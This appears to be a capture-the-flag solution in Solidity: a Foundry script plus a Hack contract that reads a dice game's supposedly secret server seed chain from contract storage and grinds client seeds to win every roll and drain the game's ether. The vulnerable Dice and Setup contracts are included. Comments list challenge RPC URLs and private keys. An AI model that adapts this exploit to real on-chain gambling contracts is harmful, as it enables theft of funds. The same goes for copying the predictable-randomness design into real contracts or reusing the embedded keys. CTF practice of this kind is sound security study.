// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0xd42f6bB2535489Cb7F028Da8D8384F538bA4d58b);
    address wallet = 0xCC1b0d6d38C9CF79A9276b187667558aE68e8316;
    Dice public dice = setup.dice();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x2b927eaf7a51702164bc3b0b2e004e04ea9e42850b88167e80aaa2173088e35c);

        console.log(wallet.balance);
        console.log(address(dice).balance);

        Hack hack = new Hack{value: 40 ether}(dice);

        bytes32 slotClientSeed = keccak256(abi.encode(address(hack), uint256(0)));
        bytes32 slotServerSeedChains = keccak256(abi.encode(uint256(keccak256(abi.encode(address(hack), uint256(0)))) + 1));

        bytes32 clientSeed = vm.load(address(dice), slotClientSeed);
        // bytes32 secret = vm.load(address(dice), keccak256(abi.encode(address(hack), uint256(0))));
        // bytes32 secret2 = vm.load(address(dice), keccak256(abi.encode(uint256(keccak256(abi.encode(address(hack), uint256(0)))) + 1)));
        // bytes32 secret3 = vm.load(address(dice), bytes32(uint256(keccak256(abi.encode(address(hack), uint256(0)))) + 2));
        bytes32[] memory serverSeedChain = new bytes32[](128);

        for(uint256 i = 0; i < 128; i++) {
            serverSeedChain[i] = vm.load(address(dice), bytes32(uint256(slotServerSeedChains) + i));
        }

        hack.init(clientSeed, serverSeedChain);
        hack.solve();
        // console.logBytes32(secret);
        // console.logBytes32(secret2);
        // console.logBytes32(secret3);
        console.log(address(hack).balance);
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}





// RPC URL http://103.87.66.171:8545/5u3uzspad1hf4ve0
// Private Key 0x2b927eaf7a51702164bc3b0b2e004e04ea9e42850b88167e80aaa2173088e35c
// Wallet Address 0xCC1b0d6d38C9CF79A9276b187667558aE68e8316
// Setup Address 0xd42f6bB2535489Cb7F028Da8D8384F538bA4d58b
// Challenge Address 0x331826c8ed6b6DCA957A9622d40727a5a27Cd127





contract Setup {
    Dice public dice;
    address public player;

    constructor(address _player) {
        dice = new Dice();
        player = _player;
    }

    function isSolved() public view returns (bool) {
        return player.balance > 1_337 ether;
    }

    function getChallengeAddress() public view returns (address) {
        return address(dice);
    }
}

contract Hack {
    // struct Game {
    //     bytes32 clientSeed;
    //     bytes32[] serverSeedChain;
    //     uint32 remainingRolls;
    // }
    Dice public dice;
    bytes32 public clientSeed;
    bytes32[] public serverSeedChain;

    constructor(Dice _dice) payable {
        dice = _dice;
        dice.startGame();
        // game = IDice(address(dice)).games(msg.sender);
        // console.log(1);
    }

    function getGameHash(bytes32 serverSeed, bytes32 _clientSeed) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(serverSeed, _clientSeed));
    }

    function getNumberFromHash(bytes32 gameHash) public pure returns (uint256) {
        return uint256(gameHash) & 0xFFFFFFFFFFFFF;
    }

    function getRoll(bytes32 gameHash) public pure returns (uint256) {
        uint256 seed = getNumberFromHash(gameHash);
        return (seed % 1000) + 1;
    }

    function init(bytes32 _clientSeed, bytes32[] memory _ssc) external {
        clientSeed = _clientSeed;
        serverSeedChain = _ssc;
    }

    function solve() external {
        for(uint256 i = 0; i < 4; i++) {
            uint256 roll = getRoll(getGameHash(serverSeedChain[127-i], clientSeed));
            uint256 loop = 0;
            while(roll < 500) {
                clientSeed = keccak256(abi.encode(loop));
                roll = getRoll(getGameHash(serverSeedChain[127-i], clientSeed));
                loop++;
            }
            if(loop > 0) {
                dice.setClientSeed(clientSeed);
            }

            if(address(this).balance >= 200 ether) {
                dice.rollDice{value: 100 ether}(uint16(roll));
            }
            else {
                dice.rollDice{value: 10 ether}(uint16(roll));
            }
        }
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}


interface IDice{
    function games(address) external view returns(Dice.Game memory);
}

contract Dice {
    struct Game {
        bytes32 clientSeed;
        bytes32[] serverSeedChain;
        uint32 remainingRolls;
    }

    mapping(address => Game) public games;

    function getGameHash(bytes32 serverSeed, bytes32 clientSeed) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(serverSeed, clientSeed));
    }

    function getNumberFromHash(bytes32 gameHash) public pure returns (uint256) {
        return uint256(gameHash) & 0xFFFFFFFFFFFFF;
    }

    function getRoll(bytes32 gameHash) public pure returns (uint256) {
        uint256 seed = getNumberFromHash(gameHash);
        return (seed % 1000) + 1;
    }

    function initialSeed(uint256 offset) public view returns (bytes32) {
        return keccak256(abi.encodePacked(block.timestamp + offset, msg.sender));
    }

    function startGame() public {
        require(games[msg.sender].remainingRolls <= 1, "Game already in progress");

        bytes32 clientSeed = initialSeed(block.number);
        bytes32[] memory serverSeedChain = new bytes32[](128);
        serverSeedChain[0] =
            keccak256(abi.encodePacked(initialSeed(block.number + 1)));

        for (uint32 i = 1; i < 128; i++) {
            serverSeedChain[i] = keccak256(abi.encodePacked(serverSeedChain[i - 1]));
        }

        games[msg.sender] = Game(clientSeed, serverSeedChain, 127);
    }

    function stopGame() public {
        require(games[msg.sender].remainingRolls > 0, "No game in progress");
        delete games[msg.sender];
    }

    function setClientSeed(bytes32 newClientSeed) public {
        require(games[msg.sender].remainingRolls > 0, "No game in progress");
        games[msg.sender].clientSeed = newClientSeed;
    }

    function rollDice(uint16 rollOver) public payable returns (bytes32 gameHash, uint256 roll) {
        require(msg.value > 0 && msg.value <= 100 ether, "Wager must be between 0 and 100 ETH");
        require(rollOver > 0 && rollOver <= 1000, "Roll over must be between 1 and 1000");

        Game storage game = games[msg.sender];
        require(game.remainingRolls > 0, "No rolls remaining");

        uint32 index = game.remainingRolls;
        gameHash = getGameHash(game.serverSeedChain[index], game.clientSeed);
        roll = getRoll(gameHash);

        if (roll >= rollOver) {
            uint256 scale = 1e6;
            uint256 numerator = 102 * scale;
            uint256 denominator = 101 * scale - (rollOver * scale / 10);
            uint256 payout = msg.value * numerator / denominator;
            require(address(this).balance >= payout, "Contract has insufficient funds");
            payable(msg.sender).transfer(payout);
        }

        game.remainingRolls--;
    }

    function getRollsLeft() public view returns (uint32) {
        return games[msg.sender].remainingRolls;
    }

    function deposit() external payable {}
    receive() external payable {}
}

// RPC URL http://103.87.66.171:8545/qq1h5hrs9h75jvw5
// Private Key 0x004f579684f272c387df8c5cc24612dc1d84f73fc0fe2ed9b4ad50ec5a47505b
// Wallet Address 0xC3825987c930Ea05B6d2FAC62e8a35B65cD55feE
// Setup Address 0x8E3EE4420272ba75223B1f9b2fe21980D87bE546
// Challenge Address 0x240E14F1B395f47FC1fe3977a954F9C2025D999b
